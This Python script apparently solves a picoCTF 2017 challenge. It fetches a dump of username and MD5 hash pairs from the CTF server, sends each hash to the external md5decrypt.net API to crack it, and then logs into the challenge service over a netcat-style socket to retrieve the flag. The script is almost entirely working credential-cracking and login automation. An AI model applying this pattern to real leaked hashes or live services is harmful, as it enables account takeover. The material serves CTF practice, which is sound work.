import requests
import os
import socket
import numpy as np

email = ""
secret_key = ""
hash_type = ""
broken_filename = 'broken_dump.npy'
broken = {}
addr = "shell2017.picoctf.com"
port = 4145


class Netcat:
    """ Python 'netcat like' module """

    def __init__(self, ip, port):
        self.buff = b""
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.connect((ip, port))

    def read(self, length=1024):
        """ Read 1024 bytes off the socket """

        return self.socket.recv(length)

    def read_until(self, data):
        """ Read data into the buffer until we have data """

        while not data in self.buff:
            self.buff += self.socket.recv(1024)

        pos = self.buff.find(data)
        rval = self.buff[:pos + len(data)]
        self.buff = self.buff[pos + len(data):]

        return rval

    def write(self, data):
        self.socket.send(data)

    def close(self):
        self.socket.close()


def gather():
    global broken
    if os.path.isfile(broken_filename) is False:
        response = requests.get("https://webshell2017.picoctf.com/static/a366befc680dc736199dd49db18294f6/hashdump.txt")
        txt = response.content.decode('ascii').strip()
        users = {key: value for key, value in (tuple(line.split(":")) for line in txt.split('\n'))}
        for key, value in users.items():
            print("name:\t" + key + "\thash:\t" + value)
            query = "http://md5decrypt.net/Api/api.php?hash=" + value + "&hash_type=" + hash_type + "&email=" + email + "&code=" + secret_key
            response = requests.get(query)
            while response.status_code != 200:
                print("Invalid return code, repeating!")
                response = response.get(query)

            if response.content != b'':
                broken[key] = response.content.decode('ascii').strip()
        np.save(broken_filename, broken)
    else:
        broken = np.load(broken_filename).item()


def crack():
    for uname, passwd in broken.items():
        nc = Netcat(addr, port)
        nc.read_until(b':\n')
        nc.write(bytes(uname, 'utf-8')+b'\n')
        nc.read_until(b':')
        nc.write(bytes(passwd, 'utf-8')+b'\n')
        nc.read_until(b'y/n\n')
        nc.write(bytes('y\n', 'utf-8'))
        msg = nc.read_until(b'from')
        if b'flag' in msg:
            print([b''.join(line.split(b'  ')[-3:]) for line in msg.split(b'\n') if b'flag' in line])
        break


def main():
    gather()
    print(broken)
    crack()


if __name__ == '__main__':
    main()